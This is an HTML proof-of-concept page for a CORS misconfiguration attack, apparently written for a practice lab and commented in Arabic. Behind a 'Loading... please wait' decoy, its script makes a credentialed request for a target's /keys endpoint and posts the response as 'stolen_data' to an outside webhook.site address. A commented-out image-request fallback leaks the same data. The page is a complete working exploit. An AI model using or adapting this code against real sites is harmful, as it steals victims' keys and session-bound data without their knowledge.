<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CORS PoC</title>
</head>
<body>

<h3>Loading... please wait</h3>

<script>
    // الـ endpoint اللي فيه المفتاح
    const targetUrl = "https://ptl-29f079a0b03c-66be1acf5fbb.libcurl.me/keys";

    // webhook الخاص بك (غيّره لو عايز webhook جديد)
    const webhook = "https://webhook.site/2a326388-6705-466d-9454-bd91d189b738";

    var xhr = new XMLHttpRequest();
    xhr.open("GET", targetUrl, true);
    xhr.withCredentials = true;          // مهم جدًا: يبعت الكوكيز

    xhr.onload = function () {
        if (xhr.status === 200 || xhr.status === 403 || xhr.status === 401) {
            var data = xhr.responseText;

            // لو الرد JSON، نحوله لstring نظيف
            try {
                var jsonData = JSON.parse(data);
                data = JSON.stringify(jsonData, null, 2);
            } catch (e) {
                // لو مش JSON، نستخدمه كما هو
            }

            // طريقة 1: إرسال عبر POST (أفضل وأنظف)
            var leakXhr = new XMLHttpRequest();
            leakXhr.open("POST", webhook, true);
            leakXhr.send("stolen_data=" + encodeURIComponent(data));

            // طريقة 2: إرسال عبر GET (لو POST ما اشتغلش)
            // new Image().src = webhook + "?data=" + encodeURIComponent(data);

            document.body.innerHTML += "<pre>تم إرسال البيانات إلى webhook\n\n" + data + "</pre>";
        } else {
            document.body.innerHTML += "<p>خطأ: " + xhr.status + " - " + xhr.statusText + "</p>";
        }
    };

    xhr.onerror = function () {
        document.body.innerHTML += "<p>فشل الاتصال بالهدف (ربما CORS أو شبكة)</p>";
    };

    xhr.send();
</script>

</body>
</html>
